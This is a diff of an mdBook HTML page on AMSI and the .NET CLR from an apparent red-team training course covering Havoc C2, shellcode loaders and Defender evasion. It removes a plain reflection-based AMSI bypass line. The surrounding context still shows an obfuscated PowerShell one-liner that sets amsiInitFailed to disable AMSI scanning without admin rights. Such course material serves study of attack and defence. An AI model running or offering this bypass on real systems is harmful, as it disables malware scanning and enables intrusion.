@@ -3,7 +3,7 @@
     <head>
         <!-- Book generated using mdBook -->
         <meta charset="UTF-8">
-        <title>AMSI - </title>
+        <title>AMSI &amp; CLR - </title>
         
 
         <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
@@ -81,7 +81,7 @@
 
         <nav id="sidebar" class="sidebar" aria-label="Table of contents">
             <div id="sidebar-scrollbox" class="sidebar-scrollbox">
-                <ol class="chapter"><li class="expanded "><a href="intro.html"><strong aria-hidden="true">1.</strong> Chapter 1 : Intro </a></li><li><ol class="section"><li class="expanded "><a href="havoc.html"><strong aria-hidden="true">1.1.</strong> Havoc C2</a></li><li class="expanded "><a href="powershell.html"><strong aria-hidden="true">1.2.</strong> Powershell</a></li><li class="expanded "><a href="amsi.html" class="active"><strong aria-hidden="true">1.3.</strong> AMSI</a></li><li class="expanded "><a href="static.html"><strong aria-hidden="true">1.4.</strong> Static Analysis</a></li><li class="expanded "><a href="chapter_1.1.html"><strong aria-hidden="true">1.5.</strong> Metasploit Basics</a></li><li class="expanded "><a href="shellcode.html"><strong aria-hidden="true">1.6.</strong> Shellcode</a></li><li><ol class="section"><li class="expanded "><a href="functions.html"><strong aria-hidden="true">1.6.1.</strong> WIN32api and Functions</a></li><li><ol class="section"><li class="expanded "><a href="lab1.1.html"><strong aria-hidden="true">1.6.1.1.</strong> Lab - Payloads</a></li><li class="expanded "><a href="lab_shellcode.html"><strong aria-hidden="true">1.6.1.2.</strong> Lab - Shellcode</a></li><li class="expanded "><a href="lab_basic.html"><strong aria-hidden="true">1.6.1.3.</strong> Lab - Basic Loader</a></li><li class="expanded "><a href="lab_staged.html"><strong aria-hidden="true">1.6.1.4.</strong> Lab - Remote Loader</a></li></ol></li></ol></li><li class="expanded "><a href="defender.html"><strong aria-hidden="true">1.7.</strong> Windows Defender</a></li><li><ol class="section"><li class="expanded "><a href="heuristics.html"><strong aria-hidden="true">1.7.1.</strong> Heuristics</a></li><li class="expanded "><a href="uac.html"><strong aria-hidden="true">1.7.2.</strong> UAC</a></li><li class="expanded "><a href="hooks.html"><strong aria-hidden="true">1.7.3.</strong> Hooks</a></li><li class="expanded "><a href="etw.html"><strong aria-hidden="true">1.7.4.</strong> ETW</a></li><li class="expanded "><a href="syscalls.html"><strong aria-hidden="true">1.7.5.</strong> Syscalls</a></li><li class="expanded "><a href=".kernelcallbacks.html"><strong aria-hidden="true">1.7.6.</strong> Kernel Callbacks</a></li><li class="expanded "><a href="edr.html"><strong aria-hidden="true">1.7.7.</strong> EDR Stuff</a></li></ol></li><li class="expanded "><a href="evasion.html"><strong aria-hidden="true">1.8.</strong> Evasion</a></li><li><ol class="section"><li class="expanded "><a href="litterbox.html"><strong aria-hidden="true">1.8.1.</strong> Forensics - Litterbox</a></li></ol></li></ol></li><li class="expanded "><a href="mdbooktricks.html"><strong aria-hidden="true">2.</strong> Chapter Extra </a></li></ol>
+                <ol class="chapter"><li class="expanded "><a href="intro.html"><strong aria-hidden="true">1.</strong> Chapter 1 : Intro </a></li><li><ol class="section"><li class="expanded "><a href="havoc.html"><strong aria-hidden="true">1.1.</strong> Havoc C2</a></li><li class="expanded "><a href="amsi.html" class="active"><strong aria-hidden="true">1.2.</strong> AMSI &amp; CLR</a></li><li><ol class="section"><li class="expanded "><a href="lab_powershell.html"><strong aria-hidden="true">1.2.1.</strong> Lab - Powershell</a></li></ol></li><li class="expanded "><a href="static.html"><strong aria-hidden="true">1.3.</strong> Static Analysis</a></li><li><ol class="section"><li class="expanded "><a href="lab_havoc_dotnet.html"><strong aria-hidden="true">1.3.1.</strong> Lab - Havoc dotnet execute</a></li></ol></li><li class="expanded "><a href="chapter_1.1.html"><strong aria-hidden="true">1.4.</strong> Metasploit Basics</a></li><li class="expanded "><a href="functions.html"><strong aria-hidden="true">1.5.</strong> WIN32api and Functions</a></li><li class="expanded "><a href="defender.html"><strong aria-hidden="true">1.6.</strong> Windows Defender</a></li><li><ol class="section"><li class="expanded "><a href="heuristics.html"><strong aria-hidden="true">1.6.1.</strong> Heuristics</a></li><li class="expanded "><a href="uac.html"><strong aria-hidden="true">1.6.2.</strong> UAC</a></li><li class="expanded "><a href="hooks.html"><strong aria-hidden="true">1.6.3.</strong> Hooks</a></li><li class="expanded "><a href="etw.html"><strong aria-hidden="true">1.6.4.</strong> ETW</a></li><li class="expanded "><a href="syscalls.html"><strong aria-hidden="true">1.6.5.</strong> Syscalls</a></li><li class="expanded "><a href=".kernelcallbacks.html"><strong aria-hidden="true">1.6.6.</strong> Kernel Callbacks</a></li><li class="expanded "><a href="edr.html"><strong aria-hidden="true">1.6.7.</strong> EDR Stuff</a></li></ol></li><li class="expanded "><a href="evasion.html"><strong aria-hidden="true">1.7.</strong> Evasion</a></li><li><ol class="section"><li class="expanded "><a href="litterbox.html"><strong aria-hidden="true">1.7.1.</strong> Forensics - Litterbox</a></li></ol></li></ol></li><li class="expanded "><a href="mdbooktricks.html"><strong aria-hidden="true">2.</strong> Chapter Extra </a></li></ol>
             </div>
             <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
         </nav>
@@ -150,7 +150,7 @@
                     <main>
                         <h1><a class="header" href="#amsi-anti-malware-scanning-interface" id="amsi-anti-malware-scanning-interface">AMSI (Anti-Malware Scanning Interface)</a></h1>
 <blockquote>
-<p>WARNING : Amsi loads into powershell, with dotner amsi integrates with the clr which loads AMSI on demand.</p>
+<p>WARNING : Amsi.dll is loaded into every powershell.exe process, but when running dotnet (csharp) binaries, amsi integrates directly with the clr which loads AMSI on demand. Amsi Bypasses that work in powershell don't necessariy work for the CLR integration.</p>
 </blockquote>
 <p>AmsiScanBuffer
 AmsiScanString
@@ -223,9 +223,6 @@ $dotnet = [System.Reflection.Assembly]::Load(&quot;mscorlib&quot;)
 $dotnet.GetName().Version
 </code></pre>
 <p><img src="./images/dotnetversion.jpg" alt="image" /></p>
-<p>Check Powershell installed on the system:</p>
-<pre><code class="language-yaml">(Get-ItemProperty HKLM:\SOFTWARE\Microsoft\PowerShell\*\PowerShellEngine -Name PowerShellVersion).PowerShellVersion
-</code></pre>
 <h2><a class="header" href="#amsitest" id="amsitest">AMSITEST</a></h2>
 <pre><code class="language-yaml">It '&quot;Antimalware Scan Interface&quot; is working' {
     # AMSI test string 'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'
@@ -238,12 +235,9 @@ $dotnet.GetName().Version
 }
 </code></pre>
 <h2><a class="header" href="#amsibypass" id="amsibypass">AMSIBYPASS</a></h2>
-<p>Works on 1803 and before</p>
 <blockquote>
 <p>This bypass does not require administrator rights!!!</p>
 </blockquote>
-<pre><code class="language-yaml">[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic, Static').SetValue($null,$true)
-</code></pre>
 <p>Works on 1903, 1909 and before</p>
 <pre><code class="language-yaml">sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  &quot;{1}{0}&quot;-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( &quot;1Q2U&quot;  +&quot;zX&quot;  )  -VaL ).&quot;A`ss`Embly&quot;.&quot;GET`TY`Pe&quot;((  &quot;{6}{3}{1}{4}{2}{0}{5}&quot; -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) ).&quot;g`etf`iElD&quot;(  ( &quot;{0}{2}{1}&quot; -f'amsi','d','InitFaile'  ),(  &quot;{2}{4}{0}{1}{3}&quot; -f 'Stat','i','NonPubli','c','c, ' )).&quot;sE`T`VaLUE&quot;(  ${n`ULl},${t`RuE} )
 </code></pre>
@@ -363,13 +357,13 @@ Babel</p>
                     <nav class="nav-wrapper" aria-label="Page navigation">
                         <!-- Mobile navigation buttons -->
                         
-                            <a rel="prev" href="powershell.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                            <a rel="prev" href="havoc.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                 <i class="fa fa-angle-left"></i>
                             </a>
                         
 
                         
-                            <a rel="next" href="static.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                            <a rel="next" href="lab_powershell.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                 <i class="fa fa-angle-right"></i>
                             </a>
                         
@@ -381,13 +375,13 @@ Babel</p>
 
             <nav class="nav-wide-wrapper" aria-label="Page navigation">
                 
-                    <a href="powershell.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                    <a href="havoc.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                         <i class="fa fa-angle-left"></i>
                     </a>
                 
 
                 
-                    <a href="static.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                    <a href="lab_powershell.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                         <i class="fa fa-angle-right"></i>
                     </a>
                 
